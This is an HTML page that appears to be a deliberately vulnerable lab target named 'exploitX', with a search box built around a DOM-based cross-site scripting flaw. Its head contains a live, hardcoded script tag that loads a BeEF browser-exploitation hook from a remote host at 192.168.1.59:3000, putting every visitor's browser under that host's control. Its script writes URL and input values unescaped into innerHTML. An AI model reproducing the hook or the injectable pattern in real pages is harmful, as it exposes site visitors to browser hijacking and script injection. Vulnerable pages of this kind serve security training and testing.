<!DOCTYPE html>
<html>
<head>
    <title>exploitX — Search</title>
    <link rel="stylesheet" href="style.css">
    <!-- BeEF Hook Hardcoded -->
    <script src="http://192.168.1.59:3000/hook.js"></script>
</head>
<body>
    <h1>Search (DOM XSS)</h1>
    <input id="q" placeholder="Search...">
    <div id="out"></div>
    <script>
    // VULNERABLE: writes URL parameter directly into innerHTML
    const params = new URLSearchParams(location.search);
    if (params.get('q')) {
        document.getElementById('out').innerHTML = "Results for: " + params.get('q');
    }
    document.getElementById('q').addEventListener('input', e => {
        document.getElementById('out').innerHTML = "Live: " + e.target.value;
    });
    </script>
    <p><a href="index.php">Back</a></p>
</body>
</html>
